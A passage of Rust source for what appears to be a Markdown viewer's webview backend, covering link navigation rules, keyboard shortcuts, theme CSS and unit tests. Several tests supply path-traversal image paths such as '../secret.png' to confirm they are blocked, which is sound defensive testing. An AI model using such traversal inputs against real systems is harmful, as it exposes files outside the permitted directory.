        toc = toc_html,
        body = body,
        highlight_script = highlight_script,
        mermaid_script = mermaid_script,
        theme_overrides = theme_overrides,
        shortcuts_help = build_shortcuts_help_html(),
        keyboard_script = keyboard_script()
    )
}

// --- Navigation -----------------------------------------------------------

/// What the window should do when the page asks to navigate to a URL.
#[derive(Debug, PartialEq, Eq)]
enum NavDecision {
    /// The document mdr injected itself: let it load.
    Allow,
    /// A same-page `#anchor`: scroll, do not navigate.
    Anchor(String),
    /// Hand the URL to the system browser and keep the document on screen.
    OpenExternally(String),
    /// Another local Markdown file: load it in this window.
    OpenDocument(PathBuf),
    /// Anything else — refused, so the document can never be replaced by a
    /// remote page the user cannot navigate back from.
    Block,
}

/// URLs that identify the page mdr loaded itself.
///
/// `with_html()` hands the HTML straight to the engine, which reports the
/// document as `about:blank` on every platform wry supports (`loadHTMLString`
/// with a nil base URL on macOS, `load_html` on WebKitGTK, `NavigateToString`
/// on WebView2).
fn is_mdr_document_url(url: &str) -> bool {
    let lower = url.trim().to_ascii_lowercase();
    lower.is_empty() || lower == "about:blank" || lower == "about:srcdoc" || lower == "about:"
}

fn has_scheme(url: &str) -> bool {
    match url.find(':') {
        None => false,
        Some(idx) => {
            let scheme = &url[..idx];
            !scheme.is_empty()
                && scheme.starts_with(|c: char| c.is_ascii_alphabetic())
                && scheme
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'))
                // `foo/bar:baz` is a relative path, not a scheme.
                && !url[..idx].contains(['/', '?', '#'])
        }
    }
}

fn is_markdown_path(path: &Path) -> bool {
    path.extension()
        .and_then(|e| e.to_str())
        .map(|e| e.eq_ignore_ascii_case("md") || e.eq_ignore_ascii_case("markdown"))
        .unwrap_or(false)
}

/// Decide what to do with a navigation request, given the document on screen.
///
/// Pure on purpose: the effects (spawning a browser, swapping the document)
/// live in the caller so this can be tested without a window.
fn navigation_decision(url: &str, current_doc: &Path) -> NavDecision {
    let url = url.trim();

    // `#anchor`, possibly already resolved against the `about:blank` base URL.
    if let Some((base, fragment)) = url.split_once('#') {
        if !fragment.is_empty() && is_mdr_document_url(base) {
            return NavDecision::Anchor(fragment.to_string());
        }
    }
    if is_mdr_document_url(url) {
        return NavDecision::Allow;
    }

    let lower = url.to_ascii_lowercase();

    if lower.starts_with("http://") || lower.starts_with("https://") || lower.starts_with("mailto:")
    {
        return NavDecision::OpenExternally(url.to_string());
    }

    if lower.starts_with("file://") {
        let rest = &url["file://".len()..];
        // `file://localhost/x` is the same as `file:///x`.
        let rest = rest.strip_prefix("localhost").unwrap_or(rest);
        let path = PathBuf::from(percent_decode(
            rest.split(['?', '#']).next().unwrap_or(rest),
        ));
        return if is_markdown_path(&path) {
            NavDecision::OpenDocument(path)
        } else {
            NavDecision::Block
        };
    }

    // A relative link, if the engine hands one over unresolved.
    if !has_scheme(url) && !url.is_empty() {
        let target = percent_decode(url.split(['?', '#']).next().unwrap_or(url));
        let path = current_doc.parent().unwrap_or(Path::new(".")).join(&target);
        if is_markdown_path(&path) {
            return NavDecision::OpenDocument(path);
        }
    }

    NavDecision::Block
}

/// Open a URL with the system browser.
///
/// No crate is pulled in for this: the platform opener is spawned directly.
/// `Command` passes the URL as a single argument without a shell, so nothing in
/// it can be interpreted — with the caveat that on Windows the URL travels
/// through `cmd.exe`, whose own quoting rules are looser; only `http(s)` and
/// `mailto` URLs, which [`navigation_decision`] alone produces, get here.
fn open_in_system_browser(url: &str) {
    use std::process::Command;

    vlog!("opening in the system browser: {}", url);
    let spawned = if cfg!(target_os = "macos") {
        Command::new("open").arg(url).spawn()
    } else if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(["/c", "start", ""])
            .arg(url)
            .spawn()
    } else {
        Command::new("xdg-open").arg(url).spawn()
    };
    if let Err(e) = spawned {
        vlog!("could not open {}: {}", url, e);
    }
}

// --- Keyboard shortcuts ---------------------------------------------------

/// IPC message the page sends when the user asks to close the window.
/// JavaScript cannot close a wry window on its own, so the request has to
/// travel back to the tao event loop.
const IPC_QUIT: &str = "mdr:quit";

/// Whether an IPC message from the page is a request to close the window.
/// Matched exactly: the page renders untrusted Markdown, so anything but the
/// literal request is ignored.
fn is_quit_request(message: &str) -> bool {
    message == IPC_QUIT
}

/// A keyboard shortcut of the webview backend.
///
/// `bindings` holds canonical tokens matched against the DOM key event:
/// an optional `mod+` prefix (Ctrl on Linux/Windows, Cmd on macOS) followed by
/// either a single character (case-sensitive, so `g` and `G` differ) or a
/// lowercased DOM key name such as `arrowdown`.
struct Shortcut {
    bindings: &'static [&'static str],
    action: &'static str,
    label: &'static str,
    description: &'static str,
    /// Whether the shortcut still fires while the caret is in the search field.
    /// Bare keys must not, or they would be swallowed instead of typed.
    fires_while_typing: bool,
}

const SHORTCUTS: &[Shortcut] = &[
    Shortcut {
        bindings: &["mod+q", "mod+w"],
        action: "quit",
        label: "Ctrl/Cmd + Q",
        description: "Close the window",
        fires_while_typing: true,
    },
    Shortcut {
        bindings: &["mod+f"],
        action: "openSearch",
        label: "Ctrl/Cmd + F",
        description: "Search in the document",
        fires_while_typing: true,
    },
    Shortcut {
        bindings: &["n"],
        action: "searchNext",
        label: "n",
        description: "Next search match",
        fires_while_typing: false,
    },
    Shortcut {
        bindings: &["N"],
        action: "searchPrev",
        label: "N",
        description: "Previous search match",
        fires_while_typing: false,
    },
    Shortcut {
        bindings: &["escape"],
        action: "closeOverlays",
        label: "Esc",
        description: "Close search, help or the expanded image",
        fires_while_typing: true,
    },
    Shortcut {
        bindings: &["j", "arrowdown"],
        action: "scrollDown",
        label: "j / Down",
        description: "Scroll down",
        fires_while_typing: false,
    },
    Shortcut {
        bindings: &["k", "arrowup"],
        action: "scrollUp",
        label: "k / Up",
        description: "Scroll up",
        fires_while_typing: false,
    },
    Shortcut {
        bindings: &[" ", "pagedown"],
        action: "pageDown",
        label: "Space / PgDn",
        description: "Page down",
        fires_while_typing: false,
    },
    Shortcut {
        bindings: &["pageup"],
        action: "pageUp",
        label: "PgUp",
        description: "Page up",
        fires_while_typing: false,
    },
    Shortcut {
        bindings: &["g", "home"],
        action: "goTop",
        label: "g / Home",
        description: "Go to the top of the document",
        fires_while_typing: false,
    },
    Shortcut {
        bindings: &["G", "end"],
        action: "goBottom",
        label: "G / End",
        description: "Go to the bottom of the document",
        fires_while_typing: false,
    },
    Shortcut {
        bindings: &["mod++", "mod+="],
        action: "zoomIn",
        label: "Ctrl/Cmd + +",
        description: "Zoom in",
        fires_while_typing: true,
    },
    Shortcut {
        bindings: &["mod+-"],
        action: "zoomOut",
        label: "Ctrl/Cmd + -",
        description: "Zoom out",
        fires_while_typing: true,
    },
    Shortcut {
        bindings: &["mod+0"],
        action: "zoomReset",
        label: "Ctrl/Cmd + 0",
        description: "Reset zoom",
        fires_while_typing: true,
    },
    Shortcut {
        bindings: &["mod+b"],
        action: "toggleToc",
        label: "Ctrl/Cmd + B",
        description: "Show or hide the table of contents",
        fires_while_typing: true,
    },
    Shortcut {
        bindings: &["mod+d"],
        action: "toggleTheme",
        label: "Ctrl/Cmd + D",
        description: "Switch between the light and dark theme",
        fires_while_typing: true,
    },
    Shortcut {
        bindings: &["mod+p"],
        action: "print",
        label: "Ctrl/Cmd + P",
        description: "Print or export to PDF",
        fires_while_typing: true,
    },
    Shortcut {
        bindings: &["?"],
        action: "toggleHelp",
        label: "?",
        description: "Show or hide this shortcut list",
        fires_while_typing: false,
    },
];

/// Minimal HTML escaping for text interpolated into the generated page.
fn escape_html(text: &str) -> String {
    text.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
}

/// The shortcut table shown by the `?` overlay, built from [`SHORTCUTS`] so the
/// documentation can never drift from the actual bindings.
fn build_shortcuts_help_html() -> String {
    let mut rows = String::new();
    for sc in SHORTCUTS {
        rows.push_str(&format!(
            "<tr><td><kbd>{}</kbd></td><td>{}</td></tr>",
            escape_html(sc.label),
            escape_html(sc.description)
        ));
    }
    format!(
        r#"<div id="shortcuts-overlay"><div id="shortcuts-panel"><h2>Keyboard shortcuts</h2><table>{rows}</table></div></div>"#
    )
}

/// The binding table handed to the page, so the JS dispatcher and the help
/// overlay share a single source of truth.
fn bindings_json() -> String {
    let entries: Vec<serde_json::Value> = SHORTCUTS
        .iter()
        .map(|sc| {
            serde_json::json!({
                "action": sc.action,
                "bindings": sc.bindings,
                "firesWhileTyping": sc.fires_while_typing,
            })
        })
        .collect();
    serde_json::to_string(&entries).unwrap_or_else(|_| "[]".to_string())
}

const KEYBOARD_JS: &str = r#"
(function() {
    var BINDINGS = __MDR_BINDINGS__;
    var byToken = {};
    BINDINGS.forEach(function(entry) {
        entry.bindings.forEach(function(token) { byToken[token] = entry; });
    });

    var ZOOM_STEPS = [70, 80, 90, 100, 110, 125, 150, 175, 200];
    var DEFAULT_ZOOM = 3;
    var zoomIdx = DEFAULT_ZOOM;
    function applyZoom() {
        document.documentElement.style.fontSize = (16 * ZOOM_STEPS[zoomIdx] / 100) + 'px';
    }

    function el(id) { return document.getElementById(id); }
    function isVisible(node) { return node && node.style.display !== 'none' && node.style.display !== ''; }
    // `.content` lays out with `overflow: visible`, so the page scrolls as a
    // whole: `document.scrollingElement` is the node that moves, and `window`
    // is the API that moves it.
    function scroller() {
        return document.scrollingElement || document.documentElement;
    }
    function systemTheme() {
        return (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) ? 'dark' : 'light';
    }

    function closeOverlays() {
        var help = el('shortcuts-overlay');
        if (isVisible(help)) { help.style.display = 'none'; return; }
        var expanded = el('expand-overlay');
        if (isVisible(expanded)) { expanded.style.display = 'none'; return; }
        if (window.closeSearch) window.closeSearch();
    }

    window.mdrActions = {
        quit: function() {
            if (window.ipc && window.ipc.postMessage) window.ipc.postMessage('__MDR_IPC_QUIT__');
        },
        openSearch: function() {
            var bar = el('searchBar');
            if (!bar) return;
            bar.style.display = 'flex';
            var input = el('searchInput');
            if (input) { input.focus(); input.select(); }
        },
        searchNext: function() { if (window.searchNav) window.searchNav(1); },
        searchPrev: function() { if (window.searchNav) window.searchNav(-1); },
        closeOverlays: closeOverlays,
        scrollDown: function() { window.scrollBy(0, 80); },
        scrollUp: function() { window.scrollBy(0, -80); },
        pageDown: function() { window.scrollBy(0, window.innerHeight * 0.9); },
        pageUp: function() { window.scrollBy(0, -window.innerHeight * 0.9); },
        goTop: function() { window.scrollTo(0, 0); },
        goBottom: function() { window.scrollTo(0, scroller().scrollHeight); },
        zoomIn: function() { if (zoomIdx < ZOOM_STEPS.length - 1) { zoomIdx++; applyZoom(); } },
        zoomOut: function() { if (zoomIdx > 0) { zoomIdx--; applyZoom(); } },
        zoomReset: function() { zoomIdx = DEFAULT_ZOOM; applyZoom(); },
        toggleToc: function() { document.body.classList.toggle('toc-hidden'); },
        toggleTheme: function() {
            var root = document.documentElement;
            var current = root.getAttribute('data-theme') || systemTheme();
            root.setAttribute('data-theme', current === 'dark' ? 'light' : 'dark');
        },
        print: function() { window.print(); },
        toggleHelp: function() {
            var help = el('shortcuts-overlay');
            if (!help) return;
            help.style.display = isVisible(help) ? 'none' : 'flex';
        }
    };

    function tokenFor(e) {
        if (!e.key) return '';
        var key = (e.key.length === 1) ? e.key : e.key.toLowerCase();
        return ((e.ctrlKey || e.metaKey) ? 'mod+' : '') + key;
    }

    function isTyping() {
        var node = document.activeElement;
        if (!node) return false;
        return node.tagName === 'INPUT' || node.tagName === 'TEXTAREA' || node.isContentEditable;
    }

    document.addEventListener('keydown', function(e) {
        var entry = byToken[tokenFor(e)];
        if (!entry) return;
        if (!entry.firesWhileTyping && isTyping()) return;
        var action = window.mdrActions[entry.action];
        if (!action) return;
        e.preventDefault();
        action(e);
    });

    var help = el('shortcuts-overlay');
    if (help) {
        help.addEventListener('click', function(e) {
            if (e.target === help) help.style.display = 'none';
        });
    }
})();
"#;

/// The keyboard layer of the generated page: the binding table plus its dispatcher.
fn keyboard_script() -> String {
    KEYBOARD_JS
        .replace("__MDR_BINDINGS__", &bindings_json())
        .replace("__MDR_IPC_QUIT__", IPC_QUIT)
}

// --- Theme toggle ---------------------------------------------------------

/// Re-emit the `prefers-color-scheme` rules of `css` under an explicit
/// `html[data-theme="..."]` scope, so the theme can also be switched by hand.
/// Rules behind any other media query are left out.
fn theme_override_css(css: &str) -> String {
    let mut out = String::new();
    let mut cursor = 0;
    while let Some(offset) = css[cursor..].find("@media") {
        let at = cursor + offset;
        let Some(open_offset) = css[at..].find('{') else {
            break;
        };
        let open = at + open_offset;
        let prelude = &css[at..open];

        let mut depth = 0usize;
        let mut close = None;
        for (idx, ch) in css[open..].char_indices() {
            match ch {
                '{' => depth += 1,
                '}' => {
                    depth -= 1;
                    if depth == 0 {
                        close = Some(open + idx);
                        break;
                    }
                }
                _ => {}
            }
        }
        let Some(close) = close else {
            break;
        };

        if prelude.contains("prefers-color-scheme") {
            let theme = if prelude.contains("dark") {
                Some("dark")
            } else if prelude.contains("light") {
                Some("light")
            } else {
                None
            };
            if let Some(theme) = theme {
                out.push_str(&scope_rules_to_theme(&css[open + 1..close], theme));
            }
        }
        cursor = close + 1;
    }
    out
}

/// Prefix every selector of `rules` with the themed root selector.
/// `:root` is replaced rather than nested, since it *is* the themed element.
fn scope_rules_to_theme(rules: &str, theme: &str) -> String {
    let scope = format!(r#"html[data-theme="{theme}"]"#);
    let mut out = String::new();
    let mut rest = rules;
    while let Some(open) = rest.find('{') {
        let Some(close_offset) = rest[open..].find('}') else {
            break;
        };
        let close = open + close_offset;
        let selectors = rest[..open].trim();
        if !selectors.is_empty() {
            let scoped: Vec<String> = selectors
                .split(',')
                .map(str::trim)
                .filter(|s| !s.is_empty())
                .map(|s| match s.strip_prefix(":root") {
                    Some(tail) => format!("{scope}{tail}"),
                    None => format!("{scope} {s}"),
                })
                .collect();
            out.push_str(&scoped.join(","));
            out.push_str(" {");
            out.push_str(&rest[open + 1..close]);
            out.push_str("}\n");
        }
        rest = &rest[close + 1..];
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn build_html_does_not_block_clipboard_in_csp() {
        let toc = vec![];
        let html = build_html("<p>Hello</p>", &toc);
        // CSP must NOT block clipboard API — it should either omit clipboard restrictions
        // or not have a restrictive default-src that prevents copy operations
        // The key is that the webview's native copy (Cmd+C/Ctrl+C) works through
        // the OS menu, not through CSP-gated JavaScript APIs
        assert!(
            html.contains("Content-Security-Policy"),
            "CSP should be present"
        );
        // Verify CSP doesn't block scripts (needed for search, mermaid, etc.)
        assert!(
            html.contains("script-src 'unsafe-inline'"),
            "Scripts must be allowed for search to work"
        );
    }

    // --- highlight.js / KDL highlighting tests ---

    #[test]
    fn highlight_js_injected_when_code_blocks_present() {
        let toc = vec![];
        let body = r#"<pre><code class="language-rust">fn main() {}</code></pre>"#;
        let html = build_html(body, &toc);
        assert!(
            html.contains("hljs.highlightAll()"),
            "hljs.highlightAll() must be present when code blocks exist"
        );
        assert!(
            html.contains("hljsDefineKdl"),
            "KDL language definition must be injected"
        );
        assert!(
            html.contains("hljs.registerLanguage('kdl'"),
            "KDL must be registered with highlight.js"
        );
    }

    #[test]
    fn highlight_js_not_injected_for_prose_only() {
        let toc = vec![];
        let html = build_html("<p>No code here</p>", &toc);
        assert!(
            !html.contains("hljs.highlightAll()"),
            "hljs should not be injected for prose-only content"
        );
        assert!(
            !html.contains("hljsDefineKdl"),
            "KDL grammar should not be injected for prose-only content"
        );
    }

    #[test]
    fn kdl_grammar_registers_correct_language_name() {
        // The grammar file must declare hljsDefineKdl and reference 'kdl' as the language name
        assert!(
            HIGHLIGHT_KDL.contains("hljsDefineKdl"),
            "Grammar must export hljsDefineKdl function"
        );
        assert!(
            HIGHLIGHT_KDL.contains("name: 'KDL'"),
            "Grammar must declare name: 'KDL'"
        );
        assert!(
            HIGHLIGHT_KDL.contains("aliases: ['kdl']"),
            "Grammar must include 'kdl' alias"
        );
    }

    #[test]
    fn kdl_grammar_covers_key_token_types() {
        // Verify the grammar handles all major KDL v2 token types
        assert!(
            HIGHLIGHT_KDL.contains("title.function"),
            "Node names need title.function scope"
        );
        assert!(
            HIGHLIGHT_KDL.contains("'attr'"),
            "Property keys need attr scope"
        );
        assert!(
            HIGHLIGHT_KDL.contains("'string'"),
            "Strings need string scope"
        );
        assert!(
            HIGHLIGHT_KDL.contains("'number'"),
            "Numbers need number scope"
        );
        assert!(
            HIGHLIGHT_KDL.contains("'literal'"),
            "Keyword literals need literal scope"
        );
        assert!(
            HIGHLIGHT_KDL.contains("'type'"),
            "Type annotations need type scope"
        );
        assert!(
            HIGHLIGHT_KDL.contains("'comment'"),
            "Comments need comment scope"
        );
    }

    #[test]
    fn kdl_grammar_handles_all_literals() {
        // #true #false #null #inf #-inf #nan must all be covered
        assert!(
            HIGHLIGHT_KDL.contains("#(?:true|false|null|nan|-inf|inf)")
                || (HIGHLIGHT_KDL.contains("true")
                    && HIGHLIGHT_KDL.contains("false")
                    && HIGHLIGHT_KDL.contains("null")
                    && HIGHLIGHT_KDL.contains("inf")),
            "Grammar must cover all KDL v2 keyword literals"
        );
    }

    #[test]
    fn kdl_grammar_handles_raw_strings() {
        // Raw strings #"..."# syntax must be present
        assert!(
            HIGHLIGHT_KDL.contains("#+\""),
            "Grammar must handle raw string start #\""
        );
        assert!(
            HIGHLIGHT_KDL.contains("\"#+"),
            "Grammar must handle raw string end \"#"
        );
    }

    #[test]
    fn kdl_grammar_handles_slashdash() {
        assert!(
            HIGHLIGHT_KDL.contains("/-"),
            "Grammar must handle slashdash comments"
        );
    }

    #[test]
    fn highlight_css_includes_both_themes() {
        assert!(
            HIGHLIGHT_CSS.contains("prefers-color-scheme:light"),
            "Must include light theme"
        );
        assert!(
            HIGHLIGHT_CSS.contains("prefers-color-scheme:dark"),
            "Must include dark theme"
        );
        // Both themes must define .hljs background
        assert!(
            HIGHLIGHT_CSS.contains("#fff"),
            "Light theme must set white background"
        );
        assert!(
            HIGHLIGHT_CSS.contains("#0d1117"),
            "Dark theme must set dark background"
        );
    }

    #[test]
    fn highlight_css_includes_kdl_overrides() {
        // Node names: bold red
        assert!(
            HIGHLIGHT_CSS.contains(".language-kdl .hljs-title"),
            "KDL node name override must be present"
        );
        assert!(
            HIGHLIGHT_CSS.contains("font-weight:bold"),
            "KDL node names must be bold"
        );
        // Property keys: italic
        assert!(
            HIGHLIGHT_CSS.contains(".language-kdl .hljs-attr"),
            "KDL property key override must be present"
        );
        assert!(
            HIGHLIGHT_CSS.contains("font-style:italic"),
            "KDL property keys must be italic"
        );
        // Attribute values: light blue
        assert!(
            HIGHLIGHT_CSS.contains(".language-kdl .hljs-string"),
            "KDL value override must be present"
        );
        // Dark mode overrides present
        assert!(
            HIGHLIGHT_CSS.contains(".language-kdl .hljs-title,.language-kdl .function_"),
            "Dark mode KDL node name override must be present"
        );
    }

    #[test]
    fn resolve_local_images_svg_rasterized_to_png() {
        let dir = std::env::temp_dir().join("mdr_test_webview_svg_raster");
        std::fs::create_dir_all(&dir).unwrap();

        let svg_content = r#"<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><rect width="100" height="100" fill="red"/></svg>"#;
        std::fs::write(dir.join("test.svg"), svg_content).unwrap();

        let html = r#"<img src="test.svg" alt="test">"#;
        let result = resolve_local_images(html, &dir);

        // SVG should be rasterized to PNG data URI (not inlined as raw SVG)
        assert!(
            result.contains("data:image/png;base64,"),
            "SVG should be rasterized to PNG, got: {}",
            result
        );
        assert!(
            !result.contains("<svg"),
            "Raw SVG should NOT be inlined (security), got: {}",
            result
        );
        assert!(
            result.contains("<img"),
            "Should remain an <img> tag with PNG data URI"
        );

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn resolve_local_images_svg_with_links_is_safe() {
        // SVGs with <a> tags must NOT be inlined (they cause navigation)
        let dir = std::env::temp_dir().join("mdr_test_webview_svg_links");
        std::fs::create_dir_all(&dir).unwrap();

        let svg_with_links = r#"<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<a href="https://example.com"><rect width="100" height="100" fill="blue"/></a></svg>"#;
        std::fs::write(dir.join("logo.svg"), svg_with_links).unwrap();

        let html = r#"<img src="logo.svg" alt="logo">"#;
        let result = resolve_local_images(html, &dir);

        // Must NOT contain raw SVG with links
        assert!(
            !result.contains("href=\"https://example.com\""),
            "SVG links must not leak into page, got: {}",
            result
        );
        assert!(
            result.contains("data:image/png;base64,"),
            "Should be rasterized to safe PNG, got: {}",
            result
        );

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn resolve_local_images_non_svg_uses_data_uri() {
        let dir = std::env::temp_dir().join("mdr_test_webview_png_datauri");
        std::fs::create_dir_all(&dir).unwrap();

        let png_path = dir.join("test.png");
        let mut img = image::RgbaImage::new(1, 1);
        img.put_pixel(0, 0, image::Rgba([255, 0, 0, 255]));
        img.save(&png_path).unwrap();

        let html = r#"<img src="test.png" alt="pixel">"#;
        let result = resolve_local_images(html, &dir);

        assert!(
            result.contains("data:image/png;base64,"),
            "PNG should use data URI, got: {}",
            result
        );
        assert!(
            result.contains("<img"),
            "img tag should be preserved for PNG, got: {}",
            result
        );

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn resolve_local_images_preserves_remote_urls_when_they_cannot_be_fetched() {
        // Remote images are now inlined when they can be downloaded (#60), so
        // the guarantee this test protects is the fallback: when the download
        // does not happen, the tag must come out untouched rather than broken.
        // Offline mode plus a `.invalid` host (RFC 2606: never resolvable) make
        // sure no request leaves the machine, whatever the global offline flag
        // does in parallel tests.
        let dir = std::env::temp_dir();
        let html = r#"<img src="https://example.invalid/image.svg" alt="remote">"#;

        crate::core::set_offline(true);
        let result = resolve_local_images(html, &dir);
        crate::core::set_offline(false);

        assert_eq!(
            result, html,
            "An unreachable remote URL must be preserved unchanged"
        );
    }

    #[test]
    fn a_remote_url_is_unescaped_before_being_fetched() {
        assert_eq!(
            unescape_url_entities("https://img.shields.io/b.svg?a=1&amp;b=2"),
            "https://img.shields.io/b.svg?a=1&b=2"
        );
        assert_eq!(
            unescape_url_entities("https://example.com/a.png"),
            "https://example.com/a.png"
        );
    }

    #[test]
    fn remote_images_are_recognised_as_fetchable() {
        // The substitution path itself needs the network, so what is tested
        // here is the branch selection: an http(s) src goes to the fetcher
        // (which declines while offline) and never to the local-file resolver.
        assert!(crate::core::net::is_remote_url(
            "https://example.invalid/a.png"
        ));
        crate::core::set_offline(true);
        let inlined = crate::core::net::remote_image_data_uri("https://example.invalid/a.png");
        crate::core::set_offline(false);
        assert_eq!(inlined, None, "offline mode must not download anything");
    }

    #[test]
    fn resolve_local_images_subdirectory_paths() {
        // Simulate the real-world scenario: images in subdirectories
        let dir = std::env::temp_dir().join("mdr_test_webview_subdir");
        let img_dir = dir.join("assets").join("screenshots");
        std::fs::create_dir_all(&img_dir).unwrap();

        // Create a real PNG file in subdirectory
        let png_path = img_dir.join("chart.png");
        let mut img = image::RgbaImage::new(2, 2);
        img.put_pixel(0, 0, image::Rgba([255, 0, 0, 255]));
        img.save(&png_path).unwrap();

        // This is what comrak generates from ![alt](assets/screenshots/chart.png)
        let html = r#"<img src="assets/screenshots/chart.png" alt="Revenue chart" />"#;
        let result = resolve_local_images(html, &dir);

        assert!(
            result.contains("data:image/png;base64,"),
            "PNG in subdirectory should be resolved to data URI, got: {}",
            &result[..result.len().min(200)]
        );
        assert!(result.contains("<img"), "Should still be an img tag");
        assert!(
            result.contains("alt=\"Revenue chart\""),
            "Alt text should be preserved"
        );

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn resolve_local_images_empty_base_dir() {
        // When file_path.parent() is empty (bare filename), base_dir is ""
        // This should still work for files that exist relative to CWD
        let dir = std::env::temp_dir().join("mdr_test_webview_empty_base");
        std::fs::create_dir_all(&dir).unwrap();

        let png_path = dir.join("test.png");
        let mut img = image::RgbaImage::new(1, 1);
        img.put_pixel(0, 0, image::Rgba([0, 255, 0, 255]));
        img.save(&png_path).unwrap();

        // With proper base_dir, it should work
        let html = r#"<img src="test.png" alt="test" />"#;
        let result = resolve_local_images(html, &dir);
        assert!(
            result.contains("data:image/png;base64,"),
            "Should resolve with proper base_dir, got: {}",
            &result[..result.len().min(200)]
        );

        // With empty base_dir, the file won't be found (unless CWD happens to match)
        let empty = std::path::PathBuf::from("");
        let result2 = resolve_local_images(html, &empty);
        // This will likely NOT find the file since CWD != dir
        // The tag should be returned unchanged
        assert!(
            result2.contains("src=\"test.png\"") || result2.contains("data:image/png;base64,"),
            "With empty base_dir, should either find file or return original, got: {}",
            &result2[..result2.len().min(200)]
        );

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn resolve_local_images_comrak_output_format() {
        // Test with the exact HTML format comrak produces from markdown images
        let dir = std::env::temp_dir().join("mdr_test_webview_comrak_format");
        let screenshots_dir = dir.join("assets").join("screenshots");
        std::fs::create_dir_all(&screenshots_dir).unwrap();

        let png_path = screenshots_dir.join("revenue.png");
        let mut img = image::RgbaImage::new(1, 1);
        img.put_pixel(0, 0, image::Rgba([0, 0, 255, 255]));
        img.save(&png_path).unwrap();

        // Comrak generates self-closing tags with alt attribute
        let html = r#"<p><img src="assets/screenshots/revenue.png" alt="Monthly Revenue Growth — Jan 2023 to Feb 2026" /></p>"#;
        let result = resolve_local_images(html, &dir);

        assert!(
            result.contains("data:image/png;base64,"),
            "Comrak-style img tag should be resolved, got: {}",
            &result[..result.len().min(300)]
        );
        assert!(
            result.contains("alt=\"Monthly Revenue Growth"),
            "Alt text with special chars should be preserved"
        );
        assert!(
            result.contains("<p>") && result.contains("</p>"),
            "Surrounding <p> tags should be preserved"
        );

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn resolve_local_images_multiple_images_in_html() {
        // Test multiple images in a single HTML string
        let dir = std::env::temp_dir().join("mdr_test_webview_multi_img");
        std::fs::create_dir_all(&dir).unwrap();

        for name in &["a.png", "b.png"] {
            let path = dir.join(name);
            let mut img = image::RgbaImage::new(1, 1);
            img.put_pixel(0, 0, image::Rgba([128, 128, 128, 255]));
            img.save(&path).unwrap();
        }

        let html = r#"<p><img src="a.png" alt="A" /></p><p><img src="b.png" alt="B" /></p>"#;
        let result = resolve_local_images(html, &dir);

        // Both images should be resolved
        let count = result.matches("data:image/png;base64,").count();
        assert_eq!(
            count,
            2,
            "Both images should be resolved to data URIs, got {} matches in: {}",
            count,
            &result[..result.len().min(300)]
        );

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn rasterize_svg_to_png_data_uri_basic() {
        let dir = std::env::temp_dir().join("mdr_test_rasterize_svg");
        std::fs::create_dir_all(&dir).unwrap();

        let svg = r#"<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" width="50" height="50"><circle cx="25" cy="25" r="20" fill="blue"/></svg>"#;
        let path = dir.join("test.svg");
        std::fs::write(&path, svg).unwrap();

        let result = rasterize_svg_to_png_data_uri(&path).unwrap();
        assert!(result.starts_with("data:image/png;base64,"));

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn resolve_local_images_allows_a_parent_directory_inside_the_project() {
        // `docs/page.md` referencing `../images/logo.png` is the layout #61 is
        // about: legitimate, and previously blocked.
        let dir = std::env::temp_dir().join("mdr_test_webview_project_images");
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join(".git")).unwrap();
        std::fs::create_dir_all(dir.join("docs")).unwrap();
        std::fs::create_dir_all(dir.join("images")).unwrap();

        let mut img = image::RgbaImage::new(1, 1);
        img.put_pixel(0, 0, image::Rgba([1, 2, 3, 255]));
        img.save(dir.join("images/logo.png")).unwrap();

        let html = r#"<img src="../images/logo.png" alt="logo">"#;
        let result = resolve_local_images(html, &dir.join("docs"));

        assert!(
            result.contains("data:image/png;base64,"),
            "An image of the enclosing project must be inlined, got: {}",
            &result[..result.len().min(200)]
        );

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn resolve_local_images_blocks_traversal_out_of_the_project() {
        // Same widening as above, but the target sits outside the project: the
        // guard must still refuse it.
        let dir = std::env::temp_dir().join("mdr_test_webview_project_escape");
        let _ = std::fs::remove_dir_all(&dir);
        let proj = dir.join("proj");
        std::fs::create_dir_all(proj.join(".git")).unwrap();
        std::fs::create_dir_all(proj.join("docs")).unwrap();

        let mut img = image::RgbaImage::new(1, 1);
        img.put_pixel(0, 0, image::Rgba([255, 0, 0, 255]));
        img.save(dir.join("secret.png")).unwrap();

        let html = r#"<img src="../../secret.png" alt="secret">"#;
        let result = resolve_local_images(html, &proj.join("docs"));

        assert!(
            !result.contains("data:image/png;base64,"),
            "Escaping the project must stay blocked, got: {}",
            &result[..result.len().min(200)]
        );
        assert!(result.contains(r#"src="../../secret.png""#), "{}", result);

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn resolve_local_images_blocks_path_traversal() {
        let dir = std::env::temp_dir().join("mdr_test_webview_traversal");
        let subdir = dir.join("docs");
        std::fs::create_dir_all(&subdir).unwrap();

        // Create a file OUTSIDE the subdir (in parent)
        let mut img = image::RgbaImage::new(1, 1);
        img.put_pixel(0, 0, image::Rgba([255, 0, 0, 255]));
        img.save(dir.join("secret.png")).unwrap();

        // Try to access it via path traversal from subdir
        let html = r#"<img src="../secret.png" alt="secret">"#;
        let result = resolve_local_images(html, &subdir);

        // Should NOT resolve to data URI — the path escapes subdir
        assert!(
            !result.contains("data:image/png;base64,"),
            "Path traversal should be blocked, got: {}",
            &result[..result.len().min(200)]
        );
        assert!(
            result.contains("src=\"../secret.png\""),
            "Original src should be preserved when blocked"
        );

        let _ = std::fs::remove_dir_all(&dir);
    }

    // --- keyboard shortcuts (webview backend) ---

    #[test]
